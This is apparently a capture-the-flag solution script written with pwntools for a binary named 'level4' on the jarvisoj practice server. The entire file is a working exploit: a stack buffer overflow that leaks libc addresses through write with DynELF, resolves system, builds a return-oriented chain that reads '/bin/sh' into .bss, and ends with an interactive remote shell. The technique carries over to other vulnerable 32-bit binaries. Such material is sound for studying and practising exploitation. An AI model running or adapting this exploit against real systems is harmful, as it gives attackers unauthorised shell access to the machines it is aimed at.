#!/usr/bin/env python
# coding=utf-8
from pwn import *
# context.log_level = "debug"
io = remote("pwn2.jarvisoj.com", 9880)
elf = ELF("./level4")

# plt.got
read_plt = elf.plt["read"]
read_got = elf.got["read"]
write_plt = elf.plt["write"]
write_got = elf.got["write"]

vuln_addr = 0x804844b
main_addr = 0x8048470
bss_addr = 0x804a024

def leak(address):
    payload = 'a' * (0x88+0x4)
    payload += p32(write_plt) + p32(vuln_addr)
    payload += p32(1) + p32(address) + p32(4)
    io.send(payload)
    data = io.recv(4)
    print "%#x => %s" % (address, (data or '').encode('hex'))
    return data

dyn = DynELF(leak,elf = ELF("./level4"))
sys_addr = dyn.lookup("system","libc")
sys_addr = dyn.lookup("__libc_system","libc")
# print hex(sys_addr)

payload = 'a' * (0x88 + 0x4)
payload += p32(read_plt) + p32(sys_addr)
payload += p32(1) + p32(bss_addr) + p32(10)
io.send(payload)
io.sendline("/bin/sh")
io.interactive()
